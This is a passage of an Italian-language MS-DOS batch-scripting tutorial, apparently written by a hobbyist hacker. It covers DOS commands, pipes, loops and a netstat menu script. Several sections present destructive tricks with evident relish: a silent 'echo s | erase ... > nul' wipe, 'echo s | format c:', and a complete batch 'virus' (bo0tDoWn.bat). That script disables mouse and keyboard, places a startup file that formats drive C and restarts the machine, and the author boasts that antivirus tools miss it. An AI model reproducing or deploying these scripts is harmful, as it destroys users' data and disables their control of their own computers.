[/B:] 

Quando inizia l'esecuzione di SMARTDrive, utilizzare la seguente sintassi: 

SMARTDRV [/X] [[unita'[+|-]]...]] [/C|/R] [/F|/N] [/Q|/S] 

Per visualizzare lo stato corrente dopo che e' stato caricato SMARTDrive, 
usare la sintassi seguente: 

SMARTDRV 
Se si specifica una lettera dell'unita' senza un segno di addizione o 
sottrazione, l'opzione di caching di lettura e' attivata e quella di 
scrittura e' disattivata. Se si specifica una lettera dell'unita' seguita 
da un segno di addizione, le due opzioni sono attivate. Se si specifica 
una lettera dell'unita' seguita da un segno di sottrazione, le opzioni 
sono disattivate. Se non si specifica una lettera dell'unita', le unita' 
dischi floppy, CD-ROM e le unita' create utilizzando Interlnk sono 
attivate con l'opzione di lettura ma non di scrittura, i dischi fissi 
conentrambe le opzioni attivate e le unita' di rete e le schede di 
memoria Microsoft Flash vengono ignorate. Per maggiori informazioni su 
come DriveSpace effettua il caching delle unita' compresse, vedere Note. 
Dimcacheiniz 
Specifica la dimensione in kilobyte della cache quando SMARTDrive viene 
avviato (quando Windows non viene eseguito). 
DimCacheWin 
Specifica, in kilobyte, in che misura SMARTDrive ridurra' la dimensione 
della cache per Windows. Quando viene avviato Windows, SMARTDrive riduce 
la dimensione della cache per recuperare memoria per l'utilizzo di 
Windows. 
Opzioni 
/X Disattiva il caching write-behind per tutte le unita'. E' possibile 
quindi attivare il caching per le singole unita' usando il parametro 
unita'+|-. 
/U Non carica il modulo caching CD-ROM di SMARTDrive anche se si possiede 
un'unita' CD-ROM. Se viene caricato SMARTDrive con l'opzione /U, non e' 
possibile attivare il caching dell'unita' CD-ROM. Se e' caricato 
SMARTDrive senza l'opzione /U, e' possibile disattivare o attivare il 
caching di singole unita' CD-ROM usando il parametro dell'unita'+|-. 
/C Scrive tutte le informazioni di cui e' stato eseguito il caching dalla 
memoria sui dischi. SMARTDrive scrive informazioni dalla memoria sul 
disco a volte quando altra attivita' del disco e' rallentata. Si potrebbe 
utilizzare questa opzione se si sta spegnendo il computer e ci si vuole 
assicurare che le informazioni cache sono state scritte sul disco. 
SMARTDrive scrive tutte le informazioni cache sul disco se si riavvia il 
computer premendo CTRL+ALT+CANC, ma non se si spegne o si preme il 
pulsante di riavvio. 
/S Visualizza informazioni addizionali circa lo stato di SMARTDrive. 

Avvertenza: Controllare che SMARTDrive abbia completato l'opzione di cache 
di scrittura prima di riavviare o spegnere il computer. Questo 
non e' necessario se si riavvia il computer premendo 
CTRL+ALT+CANC. Per fare in modo che SMARTDrive scriva tutte le 
informazioni di cui e' stato eseguito il caching sui dischi, 
digitare SMARTDRV /C al prompt dei comandi. Dopo che l'attivita' 
del disco e' stata interrotta, e' possibile riavviare il computer 
per sicurezza o spegnere il computer. 




SUBST


Associa un percorso ad una lettera di unita'. 
La lettera di unita' assegnata rappresenta un'unita' virtuale dato il suo 
possibile uso come unita' fisica all'interno dei comandi. 
Non usare il comando SUBST quando Windows e' in esecuzione. 
Sintassi 

SUBST [unita'1: [unita'2:]percorso] 

SUBST unita'1: /D 

Per visualizzare i nomi delle unita' virtuali attive, utilizzare la seguente 
sintassi: 

SUBST 

Opzione 
/D Elimina un'unita' virtuale. 




SYS


Crea un disco di avvio, copiando sul disco i file di sistema di MS-DOS 
(IO.SYS and MSDOS.SYS), l'interprete dei comandi MS-DOS (COMMAND.COM) e la 
parte di MS-DOS che fornisce accesso alle unita' compresse (DRVSPACE.BIN). Il 
comando SYS copiera' il file DRVSPACE.BIN solo se tale file si trova nella 
directory principale dell'unita' o della directory di origine. 
IO.SYS, MSDOS.SYS and DRVSPACE.BIN sono file nascosti e pertanto in genere 
non compaiono negli elenchi delle directory visualizzate dal comando DIR. 
Per visualizzare questi file, digitare DIR /A. 
Sintassi 

SYS [unita'1:][percorso] unita'2: 




TYPE


Visualizza il contenuto di un file di testo. 
Utilizzare il comando TYPE per visualizzare un file di testo senza 
modificarlo. 
Sintassi 

TYPE [unita':][percorso]nomefile 




UNDELETE


Ripristina i file eliminati in precedenza con il comando. 
UNDELETE fornisce tre livelli di protezione dei file da eliminazioni 
accidentali: metodo Sentry di eliminazione, metodo Registro di eliminazione 
e metodo Standard. Per maggiori informazioni relative ai singoli livelli di 
protezione, vedere Note. 
Per informazioni relative alla versione di Undelete per Windows, consultare 
il capitolo "Gestione del sistema" nel Manuale dell'utente di MS-DOS oppure 
la Guida di Undelete per Windows. 
Sintassi 

UNDELETE [[unita':][percorso]nomefile] [/DT|/DS|/DOS] 
UNDELETE [/LIST|/ALL|/PURGE[unita']|/STATUS|/LOAD|/UNLOAD|/S[unita' 
]|/Tunita'[-voci]] 

Opzioni 
/LIST 
Elenca i file eliminati che sono disponibili per il recupero, ma non 
recupera alcun file. Il parametro [unita':][percorso]nomefile e le 
opzioni /DT, /DS e /DOS controllano l'elenco fornito dall'opzione. 
/DOS 
Recupera soltanto i file elencati come file eliminati da MS-DOS, 
chiedendo conferma per ciascuno di essi. Se esiste un file di 
registrazione dell'eliminazione, l'opzione indica a Undelete di 
ignorarlo. 
/LOAD 
Carica nella memoria Undelete, un programma residente in memoria, 
utilizzando le informazioni definite nel file UNDELETE.INI. Se il file 
UNDELETE.INI non esiste, Undelete utilizzera' i valori predefiniti. 
/UNLOAD 
Rimuove la porzione del programma Undelete che risiede in memoria, 
impedendo in tal modo il ripristino dei file eliminati. 




UNFORMAT


Ripristina un disco cancellato dal comando FORMAT. 
UNFORMAT ripristina solo unita' disco rigido o floppy locali, mentre non puo' 
essere utilizzato per ripristinare unita' di rete. Il comando UNFORMAT puo' 
inoltre ricostruire una tabella delle partizioni del disco danneggiate su 
un'unita' disco rigido. 
Sintassi 

UNFORMAT unita': [/L] [/TEST] [/P] 

Opzioni 
/L Elenca tutti i file e le sottodirectory trovate da UNFORMAT. Se questa 
opzione non viene specificata, UNFORMAT elenca solo le sottodirectory e 
i file frammentati. Per sospendere lo scorrimento dell'elenco 
visualizzato, premere la combinazione di tast i CTRL+S. Per riprendere 
lo scorrimento, premere un tasto qualsiasi. 




VER


Visualizza il numero della versione di MS-DOS. 
Sintassi 

VER 




VOL


Visualizza l'etichetta di volume e il numero di serie del disco, se 
esistenti. 
Sintassi 

VOL [unita':] 




XCOPY


Copia file (ad eccezione dei file di sistema e nascosti) e directory, 
incluse le sottodirectory. 
Con questo comando e' possibile copiare tutti i file di una directory, 
compresi i file nelle relative sottodirectory. 
Sintassi 

XCOPY origine [destinazione] /Y|/-Y] [/A|/M] [/D:data] [/P] [/S] [/E] 
[/V] [/W] 

Opzioni 
/Y Indica che XCOPY sostituisce i file esistenti senza chiedere conferma. 
Per impostazione predefinita, se si specifica un file come file di 
destinazione, XCOPY chiedera' se si desidera sovrascrivere il file 
esistente. (Le versioni precedenti di MS-DOS sostituiscono semplicemente 
il file esistente.) Se il comando XCOPY e' parte di un file batch, XCOPY 
si comportera' come nelle precedenti versioni. Specificando questa 
opzione si ha la precedenza su tutte le impostazioni predefinite e 
correnti della variabile d'ambiente COPYCMD. 
/-Y Indica che XCOPY chiede la conferma quando sostituisce un file 
esistente. Specificando questa opzione si ha la precedenza su tutte le 
impostazioni predefinite e correnti della variabile d'ambiente COPYCMD. 
/P Chiede conferma alla creazione di ciascun file di destinazione con un 
messaggio. 
/S Copia le directory e le sottodirectory, purche' non siano vuote. Se viene 
omessa questa opzione, XCOPY ha effetto solo all'interno di una singola 
directory. 
/E Copia qualsiasi sottodirectory, anche se vuota. Con questa opzione e' 
necessario utilizzare l'opzione /S.

-=< 4 >=- L'USO DEI CARATTERI JOLLY

In ambiente DOS c'è la possibilità di raggruppare tutti i files di uno stesso tipo du
rante lo svolgimento di un'operazione. Ad esempio , se volessi che tutti i miei files
di WORD (che hanno estensione ".DOC") vengano messi in una cartella differente da que
lla in cui sono in questo momento, ammettendo che la vecchia cartella sia c:\vecchia
e che quella nuova sia c:\nuova\ , posso scrivere:

copy c:\vecchia\*.doc c:\nuova\ o altrimenti:
move c:\vecchia\*.doc c:\nuova\

C'è anche il modo di selezionare TUTTI i files che ci sono in una cartella, indipende
ntemente dalla loro estensione. Basta scrivere questo:

copy c:\vecchia\*.* c:\nuova\
move c:\vecchia\*.* c:\nuova\

Ovviamente, è sfruttabile con TUTTI i comandi, non solo con "copy" o "move".


-=< 5 >=- IL COMANDO ECHO

Il comando ECHO serve a far apparire sul monitor (o su un file, se ridirezioniamo l'out
put) una frase o una parola scritta. 

echo CIAO!
Ms Dos visualizzerà CIAO!

Possiamo anche far saltare una riga col comando echo, basta scrivere

echo.

Questo serve in caso che doveste creare un menu o delle spiegazioni con delle interlinee.


-=< 6 >=- SCRIVIAMO IL NOSTRO PRIMO BATCH

Poniamo di dovere nello stesso tempo eliminare tutti i files con estensione .doc e di
dovere rinominare tutti i files di testo (*.txt) in files con estensione .xxx, magari
perchè un certo programma ce lo richiede (il caso è assurdo, lo so, ma per fare capir
e non conosco un altro metodo :-).

Come possiamo fare?!
Prima di tutto stabiliamo che lavoreremo su due cartelle, cioè:

c:\documenti\textdoc\
c:\documenti\xxxdoc\

Quindi, creiamole subito con Windows o con Dos (vedere lassu' come fare con Dos).
Per poter fare questa prova, dobbiamo mettere nella cartella c:\documenti\textdoc\
dei files con estensione .doc (createne voi, o copiatene degli altri .. )
Mentre in c:\documenti\xxxdoc\ dobbiamo avere dei files .TXT (vale la stessa cosa anc
he qua ... trovateli o fateli voi ... )
A questo punto dobbiamo creare il BATCH.

Dal Prompt di MsDos, digitiamo:

copy con c:\documenti\prova.bat

Con questo comando scriveremo dal Prompt il nostro file.
Dovete sapere che ogni BATCH, a meno che non sia specificato, mostra all'utente OGNI
comando dato. Per esempio, se dovessimo copiare un file chiamato "Testo.txt" da una c
artella ad un altra, il computer ci visualizzerebbe il comando dato , cioè

"copy c:\testo.txt c:\documenti" ... e anche
" 1 file copiato/i"

Per evitare che visualizzi almeno il COMANDO, è utilissimo scrivere qesto comando all
inizio di tutti i nostri batch:

@echo off

ECHO OFF appunto, non mostra il comando, mentre la chiocciola davanti non mostra nemm
eno il comando "ECHO OFF". La "@" messa davanti ad un qualsiasi comando , lo nasconde
se non è stato scritto "ECHO OFF" all'inizio,mentre lo mostra se è gia stato scritto.

Okay, dopo aver scritto "@echo off" diamo un invio.
Noterete che Dos sta fungendo da editor di testoe noi possiamo scrivere tutte le stri
nghe di comandi che desideriamo. Dopo ogni comando, diamo SEMPRE un invio per andare
a capo.

Adesso dobbiamo eliminare tutti i .DOC , e lo facciamo così:

erase c:\documenti\textdoc\*.doc

Bene, adesso rinominiamo tutti i files .txt che ci sono in c:\documenti\xxxdoc\ in .XXX

rename c:\documenti\xxxdoc\*.txt *.xxx

Fatto! Se tutto va bene, possiamo vedere il nostro file tutto completo ...

@echo off
erase c:\documenti\textdoc\*.doc
rename c:\documenti\xxxdoc\*.txt *.xxx

PEr finire di digitare, premiamo Ctrl+Z e il computer ci dirà "1 file copiato/i".


-=< 7 >=- FACCIAMO PARTIRE IL NOSTRO BATCH

Andiamo a vedere da Windows il nostro batch, lo troviamo in c:\documenti\
Avviamolo e stiamo a vedere che fa. A fine del lavoro la finestra di DOS ci deve dire
"ESECUZIONE TERMINATA", restando aperta.

Se tutto è andato bene, avremo eliminato tutti i .doc e avremo rinominato tutti i .txt
in .xxx . Bene, il lavoro è stato eseguito con successo!


-=< 8 >=- INVENTIVA

Quello che vi serve per creare dei batch è solo ed esclusivamente INVENTIVA.
Con un po' di pratica, un po' di studio dei comandi principali, potrete creare un sacc
o di potenti batch. 
Mi raccomando, evitate di fare troppi danni :-), o se dovete proprio farli, fateli bene!


-=< 9 >=- RIDIREZIONARE L'OUTPUT

Con DOS è possibile ridirezionare l'output dei comandi ad una periferica o in un
file. E si puo' anche caricare i comandi di un file di testo come dei comandi pe
r DOS.

Per questo, si usano i caratteri ">" e "<"

Se volessi ad esempio scrivere la lista delle mie directory su un file di testo,
lo farei così:

dir/p > c:\dirlog.txt

Abbiamo cioè salvato tutto quello che doveva essere visualizzato sul monitor in
un file chiamato "dirlog.txt". In questo modo se non esiste, creiamo il file
dirlog.txt e ci scriviamo sopra. Se invece volessimo accodare ad un file gia pr
esente l'output dei nostri comandi, dovremmo usare ">>" anzichè ">".
Un solo ">" SOVRASCRIVE il file, mentre ">>" ACCODA tutto l'output al file gia
presente.

Se volessimo vedere cio che c'è scritto in quel file ... digitiamo:

more < c:\dirlog.txt

Adesso tutto quello che c'è scritto su quel file verrà visualizzato poco alla vo
lta sul nostro schermo.

Se volessimo stampare un documento, digitiamo:

more c:\dirlog > lpt1

IL > NUL
MsDos permette di ridirezionare l'output "nel nulla".
Cosa significa? Che il comando viene eseguito, ma non verrà visualizzato o salva
to da nessuna parte. Utile per nascondere certi comandi che non vogliamo far vis
ualizzare all'utente.

echo s | erase c:\nomecartella\*.* > nul

In questa stringa è racchiusa una vera e propria bastardata , in quanto l'utente
all'oscuro di tutto elimina ogni file nella directory.


-=< 10 >=- L'USO DELLA PIPELINE

La PIPELINE è un carattere speciale che dirige il comando che la precede al coma
ndo che viene dopo. Per farvi capire meglio, quando noi ad esempio vogliamo elim
inare tutti i files di una directory (cartella), dovremmo digitare

erase *.*

Ma il sistema ci visualizza una conferma di eliminazione ... cosa che noi NON vo
gliamo proprio per nulla!
La PIPELINE in questo caso è UTILISSIMA!

echo s | erase c:\nomecartella\*.*

Con questo comando il sistema SCRIVE (echo) una "S" alla conferma della eliminaz
ione, e quindi l'utente non potrà decidere di confermare o di stoppare il batch.
Malvagio, no?
Ovviamente, vale per TUTTI i comandi, come anche

echo s | format c:

(chi ha un minimo di intelligenza avrà capito lo scopo di questo comando!)


-=< 11 >=- L'USO DEL COMANDO "FOR"

Ogni utente che si avvicina al mondo della "programmazione" dei batch cambia la 
propria concezione di quello che puo' causare un file .BAT .

Per farvi capire, dobbiamo agire interamente da DOS.
Creiamo un batch contenente i seguenti comandi, e lo chiamiamo "name.bat"

@echo off
echo il primo parametro e' %1
echo il secondo parametro e' %2
echo il terzo parametro e' %3

Bene, adesso sempre da DOS digitiamo

name.bat MILAN INTER JUVE
Il risultato sarà:

c:\name.bat MILAN INTER JUVE
il primo parametro e' MILAN
il secondo paramentro e' INTER
il terzo parametro e' JUVE

Perchè questo?
Quando DOS trova "%1", va a prendere come nome la prima parola DOPO il nome del no
stro file batch. Dopo di quello, assegna automaticamente %2 %3 .... a tutti i nomi
(argomanti) seguenti ...

Applicato al comando FOR, la cui sintassi è:

FOR %%PARAMETRO IN(cartelle, files ...) DO COMANDO

Ovvero "Per ogni elemento in un certo luogo, esegui un comando"

ESEMPIO PRATICO

for %%a in (c:\documenti\*.doc) do echo %%a > c:\nomi.txt

Con questo comando scriviamo il nome di ogni file con estensione .DOC sul file
c:\nomi.txt

So perfettamente che non è molto semplice da capire, ma si tratta di fare solo un 
po' di esperienza, dopotutto.

-=< 12 >=- L'USO DELL' IF EXIST / IF NOT EXIST ...

DOS permette di eseguire un certo comando a certe condizioni.
Se volessimo ad esempio creare un batch che ci visualizzi un avviso se abbiamo un
certo file in una cartella, dovremmo scrivere:

if exist c:\nomefile.??? echo FILE PRESENTE

(Ovvio, i ??? sono l'estensione del file!)
La stessa cosa possiamo farla se una certa condizione NON è soddisfatta:

if not exist c:\nomefile.??? echo FILE MANCANTE

Il tutto è facilmente applicabile in ogni batch ... basta avere un po' di fantasia.
Altri esempi ...

if exist c:\windows\temp\*.* echo s | erase c:|windows\temp\*.*


-=< 13 >=- L'USO DI "GOTO"

In un batch è possibile saltare da un comando all'altro senza rispettare l'ordine.

Esempio pratico: Vogliamo che il nostro batch salti un comando se è presente un cer
to file in una cartella.

@echo off
if exist c:\documenti\file.??? goto keep
erase c:\documenti\file.???
:keep
echo FILE PRESENTE

In questo modo verrà saltata l'eliminazione del file, poiche' e è presente, DOS va a
cercare il caposaldo :keep e ricomincia l'esecuzione del bach da quel punto.

Con questa tecnica si puo' creare un loop infinito, dato che possiamo richiamare anch
e dei comandi scritti PRIMA del "GOTO".

@echo off
:init
echo BUM!
goto init

Provate a fermarloooooo !!!

L'uso di GOTO è molto importante per creare un batch SERIAMENTE intelligente, e maga
ri unendo IF ... + GOTO possiamo creare dei veri virus.


-=< 14 >=- L'USO DI "REM"

Per chi scrive i batch, non è sempre così facile ricordarsi tutto quello che viene sv
olto dopo una buona serie di comandi, e per facilitare il lavoro al programmatore dei
suddetti, è stato introdotto il comando REM

E' preticamente identico a ECHO, solo che il testo scritto dopo un REM non verrà visu
alizzato nell'esecuzione del batch. Diciamo che è un comando "Pro memoria"!

-=< 15 >=- L'USO DI "CHOICE"

CHOICE è un comando MOLTO interessante e rende i nostri batch molto piu funzionali
e dinamici. Serve sostanzialmente a far scegliere all'utente cosa fare.

La sintassi è la seguente:

CHOICE[string][/C:keys][/S][/T:key,secs]

choice /c:P5ep /S

Il flag /S abilita l'opzione "Case Sensitive" ... cioè significa che premere ad es
empio "P" e "p" significano due cose differenti.

choice SCEGLI IL BROWSER /c:NI /t:1,5

Significa che l'utente deve scegliere tra N e I e se non viene premuto nulla, dopo 
5 secondi viene automaticamente selezionato "I".

Adesso, usando il comando "IF ERRORLEVEL", completiamo il lavoro di CHOICE.
Mi spiego meglio ...

@ECHO OFF
ECHO.
ECHO.
ECHO Benvenuti nella scelta del browser
ECHO.
ECHO 1. Internet Explorer 5.5 
ECHO 2. Mozilla 5
ECHO x. Esci
ECHO.
CHOICE "Scegli" /C:12x /N
IF ERRORLEVEL 3 GOTO END
IF ERRORLEVEL 2 START C:\progra~1\Netscape
IF ERRORLEVEL 1 start c:\progra~1\intern~1\iexplore.exe
:END

In questo esempio abbiamo proprio il significato di CHOICE e IF ERRORLEVEL.
Non servono parole per capirlo, basta guardare :-)


-=< 16 >=- IL CARATTERE FANTASMA ALT 255

C'è un modo per togliere apparentemente il nome ad un file o ad una cartella.
Certo, detto così sembra una cazzata, ma vi assicuro che in molti ci cascano e
in tanti altri ci restano male!

Usando il codice ASCII (American Standard Code for Input Output) possiamo far si
che un nostro file si chiami " .bat". (nel caso della cartella non so proprio come
scriververlo :-)))) ).

Dal Prompt di MsDos scrivete:

md ALT+255 (premete ALT e con i tasti numerici sulla parte destra della tastiera
digitate 255).

Ora tramite windows andate a vedere dove avete creato quella cartella.
Troverete una cartella SENZA NOME!
Provate adesso tramite DOS a vedere quella cartella, e nell'elenco troverete qcs di
simile ...

...
DOCUME~1 <DIR> 28/12/01 14.47 Documenti
PROGRA~1 <DIR> 28/12/01 14.33 Programmi
SBPCI <DIR> 28/12/01 14.53 SBPCI
BROWSER <DIR> 28/12/01 15.11 browser
CONFIG CTL 98 28/12/01 14.46 Config.ctl
VAL BAT 1.213 10/01/02 16.14 val.bat
CLEANERS <DIR> 28/12/01 15.13 cleaners
FIREWA~1 <DIR> 28/12/01 15.27 firewalls
CONFIG NTO 708 06/02/02 16.43 config.nto
MYDOWN~1 <DIR> 03/02/02 16.22 My Downloads
200202 LOG 80 21/02/02 21.10 200202.log
<DIR> 21/02/02 21.34 ÿ
LOG TXT 0 21/02/02 21.36 log.txt
16 file 117.290 byte
16 dir Spazio disponibile 14.660.02 MB

Vedete l'ultima cartella?
Ecco cosa si presenta tramite MsDos se creerete un nome simile.

Vale la stessa medesima cosa con i FILE.
Basta che usiate come nome ALT+255 !

Divertitevi!

-=< 17 >=- IL MISTERO (O IL BUG?) DEL CESTINO BASTARDO

Tempo fa, giocando un po' col DOS da ambiente Windows, ho scoperto una cosa interessante.
Se noi prendiamo un file da finestra di DOS e lo mettiamo direttamente nel cestino
es.

copy file.xxx c:\recycled

e poi andiamo a vedere se in Windows il cestino è pieno, scopriamo che Windows non rileva
il file.
Solitamente ogni cosa che entra in c:\recycled (il cestino) viene prontamente segnalata
e l'icona del cestino cambia, diventando piena.

Tramite DOS no!
Possiamo spostare una incredibile quantità di files e cartelle nel cestino senza che
nessuno se ne accorga! E il bello è che anche riavviando, Windows non rileva nulla!

Questo trucco è testato su Windows95,98 e ME. Non so se funziona su NT, 2000 o XP.

-=< 18 >=- UN ESEMPIO DI BATCH CREATO DA ME

Colgo l'occasione di mostrarvi un mio batch, e in questo modo spero di farvi capire
come funzionino certe procedure. Prima di tutto, cmq, c'è da spendere due parole su
ll'uso di MsDos come visualizzatore delle connessioni in rete del nostro computer.
Esistono dei comandi molto importanti, che ci mostrano le varie connessioni e di con
seguenza risultano MOLTO importanti per tutti.

NETSTAT [-a] [-e] [-n] [-s] [-p proto] [-r] [intervallo]

-a Visualizza tutte le connessioni e le porte di ascolto
-e Visualizza le statistiche Ethernet
-n Visualizza gli indirizzi ed i numeri di porta in forma numerica
-p -proto Visualizza connessioni del protocollo specificato da 'proto'
che puo essere TCP, UDP o IP
-r Visualizza le statistiche per protocollo.
intervallo Rivisualizza le statistiche selezionate, interrompendo per un numero
di secondi paria 'intervallo' tra ogni visualizzazione.

NBTSTAT [-a Hostname] [-A Indirizzo IP] [-c] [-n] [-r] [-R] [-s] [S] [intervallo]

-a Mostra la tabella dei nomi del computer dando il suo hostname
-A Mostra la tabella dei nomi del computer dando il suo IP
-c Mostra la cache dei nomi del computer includendo gli indirizzi IP
-n Mostra i nomi NetBIOS locali.
-r Mostra i nomi risolti via Broadcast e via Wins
-R Aggiorna la tabella dei nomi del computer remoto
-S Mostra la tabella delle sessioni con l'IP di destinazione
-s Mostra la stessa tabella convertendo l'IP in Hostname

Hostname = Il nome della macchina remota
Intervallo = Numero che nidica l'interruzione tra una misurazione e l'altra

PING [-t] [-a] [-n numero] [-l lunghezza] [-f] [-i TTL] [-v TOS]
[-r numero] [-s numero] [ [-j elenco host] | [-k elenco host] ] 
[-w timeout] elenco destinazione

-t Esegue ping infinito. Per terminare, premere Ctrl+C
-a Visualizza gli Hostnames
-n numero Invia NUMERO richieste di eco
-l lunghezza Invia dimesione buffer
-f Imposta il Flag Non Frammentare nel pacchetto
-i TTL Vita pacchetto
-v TOS Tipo di servizio
-r count Registra route per il conteggio dei punti di passaggio
-s count Marca orario per il conteggio dei punti di passaggio
-j elenco Instradamento libero lungo l'elenco host
-k elenco Instradamento ristretto lungo l'elenco host
-w timeout Timeout in millesimi di secondo per ogni risposta

TRACERT [-d] [-h max_salti] [-j elenco host] [-w timeout] nome_destinazione

-d Non risolve gli indirizzi in hostname
-h max_salti Numero massimo di punti di passaggio per ricercare la destinazione
-j elenco Instradamento libero lungo l'elenco host
-w timeout Timeout in millisecondi per ogni risposta

Ora che ho accennato alle funzioni di questi comandi, dei quali soltanto NETSTAT
è presente nel programma sotto, possimo iniziare a vederlo.
TIP: quello che vedete dopo le "//" è un commento scritto per farvi capire, e NON
deve essere assolutamente inserito nel batch!

@echo off
if exist c:\temp echo s | erase c:\temp\*.* > nul // ELIMINIAMO I TEMP CHE INTASANO
cd %temp% //ENTRIAMO NELLA DIRECTORY DEI FILES TEMPORANEI DI WINDOWS 
echo s | erase *.* > nul //ELIMINIAMO TUTTO QUELLO CHE C'E'
cd\
:init // QUA SI RITORNA DOPO UN "GOTO"
cls //PULIAMO LO SCHERMO
echo ==============================================
echo ============================ =
echo ============================ ====== = == == == == == =
echo === Dedicato================ ====== ====== == ===== ==
echo ================ a chi ===== == == ==== == == == ==== =
echo == mi rende la ============= ====== ====== ===== == == == =
echo ================= vita ===== ====== ====== ===== === == =
echo === difficile ============== == == == ==== == == == == =
echo ============== [eViLVaL] === ====== ====== == === == == =
echo ============================ ====== === == = == == == =
echo ============================ =
echo ===================================================
echo================================================
echo ================================= ==================
echo == ==================== ==================
echo == 1. Netstat -na ================== == == ================
echo == 2. Netstat -r ============= == === === == ===========
echo == 3. Netstat -na infinito ============= ===========
echo == 4. Crea log delle connessioni ============= === == ======
echo == 5. Telnet ================== == == ================
echo == 6. Esci ==================== ==================
echo == ====================== ====================
echo =================================================
echo ================================================
choice Hai 10 secondi per scegliere. /c:123456 /t:6,10 //DOPO DIECI SECONDI IL PROGRAMMA SI CHIUDE DA SOLO 
if errorlevel 6 goto end
if errorlevel 5 goto telnet
if errorlevel 4 goto log
if errorlevel 3 goto loop
if errorlevel 2 goto netr
if errorlevel 1 goto netna

:netna
cls
echo. //LASCIAMO UNA RIGA VUOTA
echo [21=FTP, 25=SMTP, 80=HTML, 110=POP3, 137,8,9 NetBIOS, 1863=MESSENGER]
echo.
netstat -na
pause > nul //C'E' DA PREMERE UN TASTO PER ANDARE AVANTI, IN QUESTO MODO
goto init //TORNA SU A :INIT

:netr
cls
echo.
echo [21=FTP, 25=SMTP, 80=HTML, 110=POP3, 137,8,9 NetBIOS, 1863=MESSENGER]
echo.
netstat -r
pause > nul
goto init

:loop
cls
echo Per terminare, premere Ctrl+C.
pause
netstat 6
pause > nul
goto init

:log
cls
echo.
echo Adesso creo un log delle connessioni.
netstat -na > log.txt // SCRIVIAMO LE CONNESSIONI IN UN FILE
netstat -r >> log.txt
pause > nul
goto init

:telnet
cls
echo.
echo Premi INVIO per avviare TELNET.
pause > nul
telnet //APRIAMO TELNET RICHIAMANDOLO DA QUA
pause > nul
goto init

:end
exit //FINE DELL'ESECUZIONE


Questo non è nient'altro che un piccolo batch che permette di monitorare le conn
essioni con poco sforzo da parte dell'utente. In piu' ha qualche utilità come il
fatto di aprire Telnet ecc ...

Se volete usarlo, siete liberissimi di farlo!


-=< 19 >=- RUNDLL32 - LE FUNZIONI OCCULTATE

C'è un componente fondamentale di Windows, chiamato RUNDLL, che di fatto è un file
importantissimo, ma del quale si conosce poco l'utilità.

In ambiente DOS è possibile utilizzarlo per le cose piu impensabili, come per
esempio disabilitare mouse, tastiera, aprire una connessione telnet, NetMeeting o
simili diavolerie.

Qua di seguito vi riporto quelli che ho scoperto in giro per la rete o spulciando
tra le impostazioni dei files in Win98.

Disabilitazione di mouse e tastiera:

rundll32 mouse,disable
rundll32 keyboard,disable

Aprire GRAFICAMENTE delle cartelle

rundll32.exe url.dll,FileProtocolHandler c:\cartella

Aprire una connessione telnet

rundll32.exe url.dll,TelnetProtocolHandler server.smtp.it:25

SPEGNERE il computer ( o riavviarlo, a seconda dei casi)

rundll32 kernel,exitkernel


Adesso che conoscete questi trucchi, fate pochi danni, eh :-) ? 


-=< 20 >=- UNA MOSTRUOSITA' (bo0tDoWn.bat)

Qua di seguito vi illustro un piccolo ma maligno virus che ho creato per sotterrare
Windows98. Come sempre, non sono responsabile delle pu##anate che farete :-)

AVVISO IMPORTANTE ...
===[ NON toccate questo batch se non siete ASSOLUTAMENTE in grado di fermarlo,]===== 
===[ altrimenti niente e nessuno salverà il vostro PC dalla formattazione!]=======

@echo off
rundll32 mouse,disable
rundll32 keyboard,disable
echo @echo off > val.bat
echo rundll32 mouse,disable >> val.bat
echo rundll32 keyboard,disable >> val.bat
echo format c: /autotest >> val.bat
move val.bat c:\windows\menuav~1\progra~1\esecuz~1 > nul
rundll32 kernel,exitkernel

Cosa fa sostanzialmente?
La prima riga beh ... lo sapete :-)
La seconda e la terza riga DISABILITANO il mouse e la tastiera.
La terza, la quarta, la quinta, la sesta riga creano un altro file .bat con
dei comandi ben precisi.
La settima muove il file appena creato nella cartella di esecuzione automatica di
Windows, in modo da avviare il virus allo startup di Win.
L'ultima riga spegne il computer ( o lo riavvia ... non ho ancora ben chiaro,
ma a volte su certi pc mi è capitato che si spenga o si riavvii).
Dov'è il danno?
Semplice, che disabilita mouse, tastiera all'inizio, poi riavvia il computer 
e lo formatta automaticamente :-)

-=< 21 >=- TIRANDO LE SOMME

Perchè scrivere dei virus via BATCH?
Semplice ... perchè non sono virus.
Un antivirus non troverà MAI un file .BAT che crea danni, poichè sono soltanto de
gli "Innocui" comandi di DOS.

Da notare è che un batch scritto su Windows95,98 o ME NON funzionerà in toto su NT
2000 o XP. NT segue delle regole particolari, e i batch devono essere scritti con
altri criteri, che omettero' su questo tutorial.